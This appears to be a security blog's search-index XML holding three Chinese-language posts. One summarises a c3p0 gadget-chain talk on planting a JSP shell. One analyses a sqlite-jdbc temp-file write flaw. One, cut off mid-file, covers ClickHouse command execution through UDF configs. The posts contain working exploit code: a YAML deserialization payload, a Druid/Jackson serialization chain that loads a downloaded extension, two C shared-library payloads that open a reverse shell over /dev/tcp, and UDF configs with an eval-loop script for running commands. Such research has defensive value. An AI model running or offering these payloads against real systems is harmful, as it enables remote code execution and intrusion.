<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>c3p0探索——newgadget</title>
    <link href="/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/"/>
    <url>/2025/04/04/c3p0%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94newgadget/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​主要是我和springkill研究成功的一部分。 2025补天沙龙城市参会议题。复现demo的地址<a href="https://github.com/unam4/c3p0explore">https://github.com/unam4/c3p0explore</a></p><div class="row">    <embed src="c3p0新链探索—深入挖掘数据库连接池的安全隐患—unam4.pdf" width="100%" height="550" type="application/pdf"></div><h3 id="spring4shell-复现"><a href="#spring4shell-复现" class="headerlink" title="spring4shell 复现"></a>spring4shell 复现</h3><p>​原理见ppt</p><p>​这里以jndi 复现，也可以使用反序列化复现</p><p><img src="image-20250404014641040.png" alt="image-20250404014641040"></p><p>启动jndi服务</p><p><img src="image-20250404014736049.png" alt="image-20250404014736049"></p><p>成功打入第一个</p><p><img src="image-20250404014801419.png" alt="image-20250404014801419"></p><p>然后一次打入pv1-pv5</p><p><img src="image-20250404015031586.png" alt="image-20250404015031586"></p><p>打完后会在root下生成shell1.jsp  文件名有prefix+fileDateFormat+.jsp 构成</p><p><img src="image-20250404015146029.png" alt="image-20250404015146029"></p><p>最后成执行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>议题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqllitejdbc攻击</title>
    <link href="/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/"/>
    <url>/2025/03/17/sqllitejdbc%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h3><p>3.6.14.1-3.41.2.1</p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>org.sqlite.jdbc4.JDBC4Connection</p><p><img src="image-20250317125634159.png" alt="image-20250317125634159"></p><p>构造函数的参数，public，然后调用super方法</p><p>org.sqlite.SQLiteConnection#SQLiteConnection(java.lang.String, java.lang.String, java.util.Properties)</p><p><img src="image-20250317125739775.png" alt="image-20250317125739775"></p><p>super方法会一直调用父类的方法，然后在SQLiteConnection调用open方法。</p><p>org.sqlite.SQLiteConnection#open</p><p><img src="image-20250317125903898.png" alt="image-20250317125903898"></p><p>open 方法则会对filename进行判断</p><p>org.sqlite.SQLiteConnection#extractPragmasFromFilename</p><p><img src="image-20250317130556918.png" alt="image-20250317130556918"></p><p>这个函数会对jdbcurl进行判断。其中filename就是jdbc:sqlite:后面字符，要是包含?就会走else, 然后用&amp;分割,在按照&#x3D;符号存储keyvaule。</p><p>简单就是<strong>jdbc:sqlite:DBPATH?enable_load_extension&#x3D;true</strong>,先提取<strong>DBPATH?enable_load_extension&#x3D;true</strong>，然后?提取enable_load_extension&#x3D;true,然后&#x3D;分割后，put进Properties。</p><p>继续看</p><p><img src="image-20250317131247039.png" alt="image-20250317131247039"></p><p>filename中不满足这几个条件，就会判断是不是:resource:开头，是就是提取:resource:后面的字符，也就是提取协议路径，然后调用classloader读取，读不到就调用new URl 读取。然后传入extractResource。在使用netdoc协议时，由于在这里已经进行了url连接,conntion标识以为true，后续extractResource中连接时，conn.stechaches会报错。</p><p>最重要的就是这个</p><p><strong>org.sqlite.SQLiteConnection#extractResource</strong></p><p><img src="image-20250317132251846.png" alt="image-20250317132251846"></p><p>它会判断传入的协议是不是file, 是file就直接retuen，我们要出发漏洞缓存文件，肯定是要走else的</p><p><img src="image-20250317132301942.png" alt="image-20250317132301942"></p><p>else就是获取tmp目录，然后然后 **String.format(“sqlite-jdbc-tmp-%d.db”, resourceAddr.hashCode());**这个格式缓存。</p><p>最后就是URLConnection连接后获取输入流，然后内容copy到缓存文件。</p><p>这里使用的resourceAddr.hashCode(), 我们可以直接计算出来，所以这个缓存的文件，我们是可知，也就是我们可以利用jdbc连接或者直接构造函数来写一个文件到tmp目录下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vpsip:port/poc.so&quot;</span>;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> so;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>+<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">URL</span>(url).hashCode()+<span class="hljs-string">&quot;.db&quot;</span>;System.out.printf(filename);&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-修复"><a href="#0x03-修复" class="headerlink" title="0x03 修复"></a>0x03 修复</h3><p><img src="image-20250317132730082.png" alt="image-20250317132730082"></p><p>采取随机,不可控了</p><h4 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h4><p>使用yaml来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    System.setProperty(<span class="hljs-string">&quot;java.io.tmpdir&quot;</span>,<span class="hljs-string">&quot;/tmp&quot;</span>);<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8889/poc1.dylib&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:sqlite::resource:&quot;</span> + so + <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;:resource:&quot;</span> + so + <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(so).hashCode()+<span class="hljs-string">&quot;.db&quot;</span>;<br>    System.out.println(name);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!org.sqlite.jdbc4.JDBC4Connection [ \&quot;&quot;</span>+s+<span class="hljs-string">&quot;\&quot;, \&quot;&quot;</span>+filename+<span class="hljs-string">&quot;\&quot;, !!java.util.Properties []] &quot;</span>;<br>    System.out.println(poc);<br>    yaml.load(poc);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20250317140659603.png" alt="image-20250317140659603"></p><p>Sqlite.so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sqlite3ext.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br>SQLITE_EXTENSION_INIT1<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN32</span><br>__declspec(dllexport)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Initializes the SQLite extension.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param db SQLite database pointer</span><br><span class="hljs-comment"> * @param pzErrMsg Error message pointer</span><br><span class="hljs-comment"> * @param pApi SQLite API routines pointer</span><br><span class="hljs-comment"> * @return SQLITE_OK on success</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sqlite3_extension_init</span><span class="hljs-params">(</span><br><span class="hljs-params">    sqlite3 *db,</span><br><span class="hljs-params">    <span class="hljs-type">char</span> **pzErrMsg,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> sqlite3_api_routines *pApi</span><br><span class="hljs-params">)</span> &#123;<br>    <span class="hljs-type">int</span> rc = SQLITE_OK;<br>    SQLITE_EXTENSION_INIT2(pApi);<br><br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 父进程继续执行</span><br>        <span class="hljs-comment">// 可以在此处添加额外的代码逻辑</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 父进程持续执行其他任务</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 子进程继续执行</span><br>    umask(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置文件权限掩码</span><br><br>    <span class="hljs-comment">// 创建新会话，并成为会话组组长</span><br>    <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;setsid error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭标准输入、输出、错误输出</span><br>    close(STDIN_FILENO);<br>    close(STDOUT_FILENO);<br>    close(STDERR_FILENO);<br><br>    <span class="hljs-comment">// 打开一个新的文件描述符作为标准输入、输出、错误输出</span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR); <span class="hljs-comment">// 或者使用其他文件路径</span><br>    dup2(fd, STDIN_FILENO);<br>    dup2(fd, STDOUT_FILENO);<br>    dup2(fd, STDERR_FILENO);<br>    close(fd);<br><br>    <span class="hljs-comment">// 执行需要在后台运行的代码</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span>* <span class="hljs-type">const</span>*)args, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure><p>linux.so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">void</span> __attribute__ ((constructor)) my_init_so()<br>&#123;<br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 父进程继续执行</span><br>        <span class="hljs-comment">// 可以在此处添加额外的代码逻辑</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 父进程持续执行其他任务</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 子进程继续执行</span><br>    umask(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置文件权限掩码</span><br><br>    <span class="hljs-comment">// 创建新会话，并成为会话组组长</span><br>    <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;setsid error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭标准输入、输出、错误输出</span><br>    close(STDIN_FILENO);<br>    close(STDOUT_FILENO);<br>    close(STDERR_FILENO);<br><br>    <span class="hljs-comment">// 打开一个新的文件描述符作为标准输入、输出、错误输出</span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR); <span class="hljs-comment">// 或者使用其他文件路径</span><br>    dup2(fd, STDIN_FILENO);<br>    dup2(fd, STDOUT_FILENO);<br>    dup2(fd, STDERR_FILENO);<br>    close(fd);<br><br>    <span class="hljs-comment">// 执行需要在后台运行的代码</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span>* <span class="hljs-type">const</span>*)args, <span class="hljs-literal">NULL</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>要是jdbc连接</p><p> <strong>jdbc:sqlite:DBPATH?enable_load_extension&#x3D;true</strong>, 开启loadso功能，**SELECT load_extension(‘poc.dylib’)**导入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8889/poc1.dylib&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> so;<br><span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/sqlite-jdbc-tmp-&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url).hashCode()+<span class="hljs-string">&quot;.db&quot;</span>;<br>System.out.printf(filename+<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-type">DruidXADataSource</span> <span class="hljs-variable">druidDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidXADataSource</span>();<br>druidDataSource.setUrl(<span class="hljs-string">&quot;jdbc:sqlite::resource:&quot;</span>+so+<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;?enable_load_extension=true&quot;</span>);<br>druidDataSource.setLogWriter(<span class="hljs-literal">null</span>);<br>druidDataSource.setStatLogger(<span class="hljs-literal">null</span>);<br>druidDataSource.setValidationQuery(<span class="hljs-string">&quot;SELECT load_extension(&#x27;&quot;</span>+filename+<span class="hljs-string">&quot;&#x27;)&quot;</span>);<br>druidDataSource.setInitialSize(<span class="hljs-number">1</span>);<br><br>utils.setFieldValue(druidDataSource,<span class="hljs-string">&quot;transactionHistogram&quot;</span>,<span class="hljs-literal">null</span>);<br>utils.setFieldValue(druidDataSource,<span class="hljs-string">&quot;initedLatch&quot;</span>,<span class="hljs-literal">null</span>);<br><br><span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(druidDataSource);<br><span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> utils.maskmapToString(jsonNodes, jsonNodes);<br><span class="hljs-type">byte</span>[] serialize = utils.serialize(hashMap);<br>utils.unserialize(serialize);<br></code></pre></td></tr></table></figure><p><img src="image-20250318203033044.png" alt="image-20250318203033044"></p><h3 id="refence"><a href="#refence" class="headerlink" title="refence"></a>refence</h3><p><a href="https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ">https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ</a></p><p><a href="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/">https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>从deepseek未授权探索clickhouse命令执行</title>
    <link href="/2025/02/21/%E4%BB%8Edeepseek%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A2%E7%B4%A2clickhouse%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/02/21/%E4%BB%8Edeepseek%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A2%E7%B4%A2clickhouse%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>​DeepSeek近期因未授权漏洞事件而引发严重的安全争议，该公司未加密的ClickHouse服务器，可以直接未授权访问。所以就有准备探索一下clickhouse这个数据库。</p><p>​ClickHouse是一个开源的列式数据库管理系统，专门设计用于在线分析处理（OLAP）场景。它由俄罗斯的Yandex开发，旨在高效处理大规模数据集并支持快速查询和实时数据分析。</p><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl https://clickhouse.com/ | sh<br>//用sudo或者root 安装<br>./clickhouse install<br>//连接 or 启动  -h 指定 host <br>sudo clickhouse client<br>sudo clickhouse start<br></code></pre></td></tr></table></figure><p>默认目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/etc/clickhouse-server/    // 默认config目录 <br>/var/lib/clickhouse    //默认数据库<br></code></pre></td></tr></table></figure><p>etc&#x2F;clickhouse-server&#x2F;config.xml中，取消注视后，监听所有，默认只监听127.0.0.1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listen_host</span>&gt;</span>::<span class="hljs-tag">&lt;/<span class="hljs-name">listen_host</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x02-udf"><a href="#0x02-udf" class="headerlink" title="0x02  udf"></a>0x02  udf</h3><p><a href="https://clickhouse.com/docs/en/sql-reference/functions/udf">https://clickhouse.com/docs/en/sql-reference/functions/udf</a></p><p>ClickHouse 可以采用udf调用任何外部可执行程序或脚本处理数据。</p><p>主要关注一下</p><ul><li><code>execute_direct</code> - 如果 <code>execute_direct</code> &#x3D; <code>1</code> ，则将在用户指定的 user_scripts_path 中的 user_scripts 文件夹内搜索 <code>command</code> 。可以使用空格分隔符指定额外的脚本参数。例如： <code>script_name arg1 arg2</code> 。如果 <code>execute_direct</code> &#x3D; <code>0</code> ，则将 <code>command</code> 作为参数传递给 <code>bin/sh -c</code> 。默认值为 <code>1</code> 。可选参数。</li><li><code>lifetime</code> - 函数的重新加载间隔（秒）。如果设置为 <code>0</code> ，则函数不会重新加载。默认值为 <code>0</code> 。可选参数。</li><li><code>format</code> - 一种将参数传递给命令的格式</li><li><code>command</code> - 要执行的脚本名称或命令，如果 <code>execute_direct</code> 为假。</li></ul><p>这样我们可以得出结论，<code>execute_direct</code> &#x3D; <code>0</code> ，则将 <code>command</code> 作为参数传递给 <code>bin/sh -c</code>。然后指定一下格式，以及lifetime时间。</p><p>就可以写出一个执行命令的xml。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">functions</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">function</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>executable<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>shell<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">return_type</span>&gt;</span>String<span class="hljs-tag">&lt;/<span class="hljs-name">return_type</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">format</span>&gt;</span>raw<span class="hljs-tag">&lt;/<span class="hljs-name">format</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">execute_direct</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">execute_direct</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">lifetime</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">lifetime</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">function</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">functions</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中默认的配置文件夹在&#x2F;etc&#x2F;clickhouse-server&#x2F; ，也就是我们把他写到这个文件下就可以调用。</p><p><a href="https://github.com/ClickHouse/ClickHouse/blob/master/programs/server/config.xml">https://github.com/ClickHouse/ClickHouse/blob/master/programs/server/config.xml</a></p><p>这里注意文件名在config中默认配置为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user_defined_executable_functions_config</span>&gt;</span>*_function.*ml<span class="hljs-tag">&lt;/<span class="hljs-name">user_defined_executable_functions_config</span>&gt;</span><br></code></pre></td></tr></table></figure><p>所以文件名 用 xxx_function.xml 就好。</p><p><img src="image-20250205015644020.png" alt="image-20250205015644020"></p><p>创建后可以进行查询</p><p>通过继续查看后，可以发现，clickhouse可以调用python脚本、sh脚本。</p><p>配置也是差不多，和上面的xml一样，在<execute_direct>为true的时候，command会在**&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;user_scripts&#x2F;**下找对应的脚本。默认不填写是为true。</execute_direct></p><p>这里给一个poc</p><p>&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;user_scripts&#x2F;test_shell.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>while read read_data;<br>    do eval &quot; $read_data &quot;;<br>done<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;clickhouse-server&#x2F;test4_function.xml </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">functions</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">function</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>executable<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>test_shell<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">return_type</span>&gt;</span>String<span class="hljs-tag">&lt;/<span class="hljs-name">return_type</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">argument</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>String<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span 